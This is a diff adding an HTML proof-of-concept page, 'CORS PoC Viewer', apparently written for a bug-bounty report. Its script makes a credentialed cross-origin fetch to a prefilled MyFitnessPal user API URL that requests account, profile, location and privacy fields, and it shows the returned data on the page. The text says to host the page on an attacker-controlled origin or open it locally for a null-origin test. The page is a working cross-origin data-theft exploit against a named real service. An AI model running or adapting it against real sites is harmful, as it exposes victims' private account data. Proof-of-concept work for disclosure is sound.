@@ -1,0 +1,133 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>CORS PoC Viewer</title>
+  <style>
+    :root { --bg:#0b1020; --panel:#11182d; --text:#e8ecf6; --muted:#9ca7c7; --accent:#7aa2ff; --border:#25304f; --good:#2fd27c; --bad:#ff6b6b; }
+    body { margin:0; font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; background:var(--bg); color:var(--text); }
+    .wrap { max-width: 980px; margin: 0 auto; padding: 24px; }
+    .card { background:var(--panel); border:1px solid var(--border); border-radius:18px; padding:20px; box-shadow: 0 10px 30px rgba(0,0,0,.25); }
+    h1 { margin: 0 0 8px; font-size: 28px; }
+    p { color: var(--muted); line-height:1.5; }
+    label { display:block; margin: 14px 0 6px; font-weight:600; }
+    input, textarea, button {
+      width:100%; box-sizing:border-box; border-radius:14px; border:1px solid var(--border);
+      background:#0c1326; color:var(--text); padding:14px 16px; font-size:15px;
+    }
+    textarea { min-height: 110px; resize: vertical; font-family: ui-monospace, SFMono-Regular, Consolas, monospace; }
+    button { margin-top: 14px; cursor:pointer; background: linear-gradient(135deg, #4f7cff, #7aa2ff); border:none; font-weight:700; }
+    button:hover { filter: brightness(1.05); }
+    .grid { display:grid; grid-template-columns: 1fr 1fr; gap:16px; margin-top:16px; }
+    .box { background:#0c1326; border:1px solid var(--border); border-radius:14px; padding:14px; }
+    .kv { display:grid; grid-template-columns: 160px 1fr; gap:8px 12px; font-size:14px; }
+    .k { color: var(--muted); }
+    .status { font-weight:700; }
+    .good { color: var(--good); }
+    .bad { color: var(--bad); }
+    pre {
+      margin: 0; white-space: pre-wrap; word-break: break-word; overflow:auto;
+      max-height: 420px; font-size: 13px; line-height: 1.45;
+    }
+    .note { margin-top:12px; font-size: 13px; color: var(--muted); }
+    code { background:#0c1326; padding:2px 6px; border-radius:8px; border:1px solid var(--border); }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <h1>CORS PoC Viewer</h1>
+      <p>
+        This page attempts a credentialed cross-origin request and displays the response body on the page.
+        For a <code>null</code> origin test, open this file locally as <code>file://</code>.
+        For an attacker-origin test, host it on any external HTTPS page you control.
+      </p>
+
+      <label for="target">Target URL</label>
+      <input id="target" type="text" value="https://www.myfitnesspal.com/api/services/users?fields%5B%5D=diary_preferences&fields%5B%5D=privacy_preferences&fields%5B%5D=goal_preferences&fields%5B%5D=unit_preferences&fields%5B%5D=account&fields%5B%5D=goal_displays&fields%5B%5D=location_preferences&fields%5B%5D=system_data&fields%5B%5D=profiles&fields%5B%5D=step_sources&fields%5B%5D=app_preferences&fields%5B%5D=partner_only_fields&fields%5B%5D=social_preferences" />
+
+      <label for="method">Method</label>
+      <input id="method" type="text" value="GET" />
+
+      <label for="headers">Optional extra headers (one per line, format: Name: Value)</label>
+      <textarea id="headers" placeholder="X-Csrf-Token: ..."></textarea>
+
+      <button id="run">Run PoC</button>
+
+      <div class="grid">
+        <div class="box">
+          <div class="kv">
+            <div class="k">Current page origin</div><div id="origin" class="status"></div>
+            <div class="k">Fetch state</div><div id="state" class="status">Idle</div>
+            <div class="k">HTTP status</div><div id="httpstatus">-</div>
+            <div class="k">ACAO</div><div id="acao">-</div>
+            <div class="k">ACAC</div><div id="acac">-</div>
+          </div>
+        </div>
+        <div class="box">
+          <pre id="meta">Click “Run PoC” to fetch and display the response.</pre>
+        </div>
+      </div>
+
+      <label for="output">Readable response body</label>
+      <textarea id="output" readonly placeholder="The response body will appear here if the browser allows cross-origin reading."></textarea>
+
+      <div class="note">
+        Tip: for your report, a screenshot of this page showing the returned sensitive JSON is usually stronger than header screenshots alone.
+      </div>
+    </div>
+  </div>
+
+<script>
+  const $ = (id) => document.getElementById(id);
+
+  $("origin").textContent = location.origin || "null (file:// or sandboxed origin)";
+
+  $("run").addEventListener("click", async () => {
+    $("state").textContent = "Running...";
+    $("httpstatus").textContent = "-";
+    $("acao").textContent = "-";
+    $("acac").textContent = "-";
+    $("meta").textContent = "";
+    $("output").value = "";
+
+    const target = $("target").value.trim();
+    const method = $("method").value.trim().toUpperCase() || "GET";
+
+    const headers = new Headers();
+    const raw = $("headers").value.split("\n").map(s => s.trim()).filter(Boolean);
+    for (const line of raw) {
+      const idx = line.indexOf(":");
+      if (idx > 0) headers.append(line.slice(0, idx).trim(), line.slice(idx + 1).trim());
+    }
+
+    try {
+      const res = await fetch(target, {
+        method,
+        credentials: "include",
+        mode: "cors",
+        headers
+      });
+
+      $("state").textContent = "Response received";
+      $("httpstatus").textContent = `${res.status} ${res.statusText}`;
+      $("acao").textContent = res.headers.get("Access-Control-Allow-Origin") || "(not exposed to JS)";
+      $("acac").textContent = res.headers.get("Access-Control-Allow-Credentials") || "(not exposed to JS)";
+
+      const text = await res.text();
+      $("output").value = text;
+
+      let parsed = text;
+      try { parsed = JSON.stringify(JSON.parse(text), null, 2); } catch (_) {}
+      $("meta").textContent =
+        `Length: ${text.length} chars\n\n` +
+        `Response preview:\n${parsed.slice(0, 4000)}`;
+    } catch (e) {
+      $("state").textContent = "Blocked / failed";
+      $("meta").textContent = String(e);
+    }
+  });
+</script>
+</body>
+</html>
